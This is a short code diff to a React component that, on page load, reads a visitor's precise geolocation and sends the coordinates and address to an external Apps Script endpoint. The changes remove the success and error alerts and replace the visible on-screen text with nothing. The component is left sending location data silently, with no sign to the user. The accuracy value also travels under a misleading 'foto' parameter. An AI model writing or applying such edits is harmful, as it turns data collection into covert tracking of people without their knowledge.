@@ -40,11 +40,8 @@ export default function SendLocation() {
 
           // kirim ke Apps Script
           await fetch(url + `?lokasi=${lokasi}&kota=${address}&foto=${akurat}`);
-
-          alert("Lokasi terkirim!");
         },
         (err) => {
-          alert("Izin lokasi ditolak atau GPS error");
         },
         {
           enableHighAccuracy: true,
@@ -57,5 +54,5 @@ export default function SendLocation() {
     sendLocation();
   }, []);
 
-  return <div>tekan tgl untuk mengisi</div>;
+  return null
 }
